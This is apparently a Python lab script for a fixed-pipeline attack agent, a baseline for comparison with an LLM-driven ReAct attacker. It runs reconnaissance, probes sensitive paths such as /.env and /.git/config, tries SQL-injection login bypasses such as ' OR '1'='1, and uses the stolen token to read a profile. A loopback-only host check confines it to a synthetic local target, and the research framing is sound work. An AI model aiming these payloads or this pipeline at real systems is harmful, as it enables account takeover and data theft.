"""Fixed-pipeline attack agent: recon -> enumerate -> probe -> exploit -> report.

This is the DETERMINISTIC architecture (baseline) to compare against Cochise's
ReAct agent. The order of operations is hard-coded; the "brain" does not choose
what to do next. A pluggable decide() hook is left for the LLM-brain variant.

SAFETY (code-enforced):
  * ALLOWED_HOSTS gate: every request URL is parsed and refused unless the host
    is loopback. This agent physically cannot send traffic off-box.
  * Talks only to the one target base URL passed in.
  * No real exploit frameworks; only HTTP against our own synthetic target.

Run (target must be up):  python agent_lab/fixed_agent.py --base http://127.0.0.1:8700
"""
import argparse
import json
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

ALLOWED_HOSTS = {'127.0.0.1', 'localhost', '::1'}

# Endpoint enumeration wordlist (web/ATO flavoured, not generic host pentest).
WORDLIST = ['/', '/login', '/api/profile', '/api', '/admin', '/api/admin',
            '/backup.sql', '/.git/config', '/.env', '/robots.txt', '/wp-login.php',
            '/dashboard', '/static']

# SQLi / auth-bypass probes for the login form (lab payloads).
SQLI_PROBES = ["' OR '1'='1", "admin'--", "' OR 1=1--", "student'--"]


def _check_host(url):
    host = urllib.parse.urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        raise PermissionError(f'blocked non-loopback target: {host!r} (allowed: {ALLOWED_HOSTS})')
    return host


class Agent:
    def __init__(self, base, session='', wordlist=None):
        self.base = base.rstrip('/')
        _check_host(self.base)
        self.session = session
        self.wordlist = list(wordlist) if wordlist is not None else list(WORDLIST)
        self.requests = 0
        self.report = dict(base=self.base, phases={}, session=session,
                           started=datetime.now(timezone.utc).isoformat())

    def _hdr(self, headers=None):
        h = dict(headers or {})
        if self.session:
            h['X-Session'] = self.session
        return h

    def _get(self, path, headers=None):
        url = self.base + path
        _check_host(url)
        req = urllib.request.Request(url, headers=self._hdr(headers), method='GET')
        self.requests += 1
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', 'replace')
        except Exception as e:  # noqa: BLE001 — lab tool, surface any transport error
            return None, str(e)

    def _post(self, path, form):
        url = self.base + path
        _check_host(url)
        data = urllib.parse.urlencode(form).encode()
        req = urllib.request.Request(url, data=data, method='POST',
                                     headers=self._hdr({'Content-Type': 'application/x-www-form-urlencoded'}))
        self.requests += 1
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', 'replace')
        except Exception as e:  # noqa: BLE001
            return None, str(e)

    # ---- phases ---------------------------------------------------------
    def recon(self):
        status, body = self._get('/')
        links = []
        if body:
            for tok in body.split('href='):
                if tok.startswith(("'", '"')):
                    links.append(tok[1:].split(tok[0], 1)[0])
        self.report['phases']['recon'] = dict(root_status=status, links=links,
                                              reachable=status is not None)
        return status is not None

    def enumerate(self):
        found = []
        for p in self.wordlist:
            status, _ = self._get(p)
            if status and status != 404:
                found.append(dict(path=p, status=status))
        self.report['phases']['enumerate'] = dict(found=found, tried=len(self.wordlist))
        return found

    def probe(self):
        """Try SQLi/auth-bypass on /login. Returns a working payload or None."""
        # benign baseline first (so the log shows a normal attempt too)
        self._post('/login', dict(username='student', password='wrongpw'))
        working = None
        for payload in SQLI_PROBES:
            status, body = self._post('/login', dict(username=payload, password='x'))
            try:
                ok = json.loads(body).get('authenticated') is True
            except Exception:  # noqa: BLE001
                ok = False
            if ok:
                working = payload
                break
        self.report['phases']['probe'] = dict(sqli_payload=working, vulnerable=bool(working))
        return working

    def exploit(self, payload):
        """Use the working payload to log in, then grab the crown jewel."""
        status, body = self._post('/login', dict(username=payload, password='x'))
        try:
            token = json.loads(body).get('token')
        except Exception:  # noqa: BLE001
            token = None
        jewel = None
        if token:
            s, b = self._get('/api/profile', headers={'Authorization': f'Bearer {token}'})
            if s == 200:
                jewel = b
        takeover = jewel is not None
        self.report['phases']['exploit'] = dict(token=token, crown_jewel=jewel,
                                               takeover=takeover)
        return takeover

    def run(self):
        t0 = time.monotonic()
        outcome = 'unreachable'
        if self.recon():
            self.enumerate()
            payload = self.probe()
            if payload:
                outcome = 'takeover' if self.exploit(payload) else 'exploit_failed'
            else:
                outcome = 'no_vuln_found'
        self.report['outcome'] = outcome
        self.report['total_requests'] = self.requests
        self.report['wall_seconds'] = round(time.monotonic() - t0, 2)
        self.report['finished'] = datetime.now(timezone.utc).isoformat()
        return self.report


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base', default='http://127.0.0.1:8700')
    ap.add_argument('--out', default='')
    args = ap.parse_args()
    report = Agent(args.base).run()
    text = json.dumps(report, ensure_ascii=False, indent=2)
    if args.out:
        from pathlib import Path
        Path(args.out).write_text(text, encoding='utf-8')
    print(text)


if __name__ == '__main__':
    main()
